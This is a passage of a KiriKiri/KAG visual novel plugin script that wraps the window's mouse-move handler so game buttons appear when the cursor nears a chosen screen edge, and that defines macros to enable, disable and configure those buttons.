	function onExchangeForeBack()
	{
		var tmp;

		tmp = backButtons;
		backButtons = foreButtons;
		foreButtons = tmp;

		tmp = backSeen;
		backSeen = foreSeen;
		foreSeen = tmp;
	}
}
kag.addPlugin(global.gameButton_object = new GameButtonPlugin(kag));

// このオブジェクトを作った時点でウィンドウのonMouseMove横取り！
kag.gbtn_org_onMouseMove = kag.onMouseMove;
kag.onMouseMove = function(x, y, shift){
	if(!sysGameButtonHold){
		var yokoPix = 160; //120;
		var tatePix = 51;
		var freePix = 2;
		x = kag.fore.base.cursorX;
		y = kag.fore.base.cursorY;
		if(sf.gameButtonPos == 0){
			if((x < yokoPix) && x > freePix){
				gameButton_object.btnVisible();
			}else{
				gameButton_object.btnInvisible();
			}
		}else if(sf.gameButtonPos == 2){
			if((x > scWidth-yokoPix) && x < scWidth-freePix){
				gameButton_object.btnVisible();
			}else{
				gameButton_object.btnInvisible();
			}
		}else{
			// 1の場合
			if((y > (scHeight-tatePix)) && y < scHeight-freePix){
				gameButton_object.btnVisible();
			}else{
				gameButton_object.btnInvisible();
			}
		}
	}
	return gbtn_org_onMouseMove(...);
}incontextof kag;

@endscript

@endif
;
; マクロの登録
@macro name="gamebutton"
@secondaudio_disable
@eval exp="gameButton_object.setOptions(mp)"
@endmacro

@macro name="secondaudio_enable"
@eval exp="gameButton_object.onEnableButton()"
@endmacro
@macro name="secondaudio_disable"
@eval exp="gameButton_object.onDisableButton()"
@endmacro

@return
